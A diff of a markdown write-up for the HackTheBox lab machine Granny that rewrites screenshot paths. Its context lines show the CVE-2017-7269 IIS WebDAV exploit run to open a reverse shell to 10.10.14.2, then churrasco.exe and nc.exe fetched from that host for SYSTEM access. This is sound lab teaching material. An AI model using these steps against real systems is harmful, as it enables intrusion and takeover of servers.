@@ -44,7 +44,7 @@ We begin by checking if the target is alive with ICMP:
 ping -c 1 10.10.10.15
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Granny/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The machine responds, confirming it is alive.
 
@@ -60,7 +60,7 @@ We scan all 65,535 TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allPorts
 ```
 
-![allports](cases/HackTheBox/Machines/EASY/Granny/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -68,7 +68,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Granny/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 Only port **80/tcp** is open.
 
@@ -84,7 +84,7 @@ We run a deeper scan with version detection and default NSE scripts:
 nmap -p80 -sC -sV 10.10.10.15 -oN targeted
 ```
 
-![targeted](cases/HackTheBox/Machines/EASY/Granny/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -120,11 +120,11 @@ We clone the exploit:
 git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 ```
 
-![exploit](cases/HackTheBox/Machines/EASY/Granny/screenshots/exploit.png)
+![exploit](screenshots/exploit.png)
 
 This is a classic **buffer overflow** triggered via the **PROPFIND** WebDAV request:
 
-![exploit_propfind](cases/HackTheBox/Machines/EASY/Granny/screenshots/exploit_propfind.png)
+![exploit_propfind](screenshots/exploit_propfind.png)
 
 The exploit script requires:
 
@@ -139,7 +139,7 @@ We run the exploit and set up a listener with `nc`:
 python2 iis6\ reverse\ shell 10.10.10.15 80 10.10.14.2 443
 ```
 
-![exploit_run](cases/HackTheBox/Machines/EASY/Granny/screenshots/exploit_run.png)
+![exploit_run](screenshots/exploit_run.png)
 
 âœ… Reverse shell obtained.
 
@@ -152,15 +152,15 @@ We check our privileges and system structure:
 whoami
 ```
 
-![whoami](cases/HackTheBox/Machines/EASY/Grandpa/screenshots/whoami.png)
+![whoami](screenshots/whoami.png)
 
 On Windows Server 2003, user profiles are located in **`Documents and Settings`** instead of `Users`:
 
-![users](cases/HackTheBox/Machines/EASY/Granny/screenshots/users.png)
+![users](screenshots/users.png)
 
 Checking privileges:
 
-![priv](cases/HackTheBox/Machines/EASY/Granny/screenshots/priv.png)
+![priv](screenshots/priv.png)
 
 We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege escalation.
 
@@ -171,7 +171,7 @@ We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege
 
 Normally, **JuicyPotato** would be used, but it does not support Windows Server 2003 due to missing CLSIDs. 
 
-![JP_clsid](cases/HackTheBox/Machines/EASY/Granny/screenshots/JP_clsid.png)
+![JP_clsid](screenshots/JP_clsid.png)
 
 Instead, we use **Churrasco.exe**, a community version adapted for Windows Server 2003.
 
@@ -190,7 +190,7 @@ dir \\10.10.14.2\smbFolder\
 copy \\10.10.14.2\smbFolder\churrasco.exe churrasco.exe
 ```
 
-![upload_churrasco](cases/HackTheBox/Machines/EASY/Granny/screenshots/upload_churrasco.png)
+![upload_churrasco](screenshots/upload_churrasco.png)
 
 Move to `Temp` directory if copying fails.  
 
@@ -211,7 +211,7 @@ If it fails, try renaming the share or copying locally:
 copy "\\10.10.14.2\smb\nc.exe" nc.exe
 ```
 
-![whoami_churrasco](cases/HackTheBox/Machines/EASY/Grandpa/screenshots/whoami_churrasco.png)
+![whoami_churrasco](screenshots/whoami_churrasco.png)
 
 âœ… Privilege escalation successful â€“ we are `NT AUTHORITY\SYSTEM`.
 
@@ -223,7 +223,7 @@ With SYSTEM access, we can retrieve both flags:
 dir C:\Documents and Settings\Administrator\Desktop
 ```
 
-![root_user_flag](cases/HackTheBox/Machines/EASY/Granny/screenshots/root_user_flag.png)
+![root_user_flag](screenshots/root_user_flag.png)
 
 âœ… **User flag obtained**  
 âœ… **Root flag obtained**
